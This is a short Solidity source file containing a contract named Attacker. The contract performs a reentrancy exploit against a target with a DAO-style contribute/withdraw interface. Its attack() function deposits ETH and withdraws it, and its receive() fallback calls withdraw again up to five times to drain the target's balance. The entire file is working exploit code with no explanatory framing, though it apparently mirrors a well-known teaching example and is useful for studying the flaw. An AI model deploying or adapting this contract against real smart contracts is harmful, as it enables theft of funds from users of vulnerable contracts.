// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITheDAO {
    function contribute() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    ITheDAO public vulnerable;
    uint256 public attackAmount = 1 ether;
    uint256 public count;

    constructor(address _target) payable {
        vulnerable = ITheDAO(_target);
    }

    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ETH to attack");
        vulnerable.contribute{value: msg.value}();
        vulnerable.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(vulnerable).balance >= attackAmount && count < 5) {
            count++;
            try vulnerable.withdraw(attackAmount) {
                // success
            } catch {
                // prevent reverts in chain
            }
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
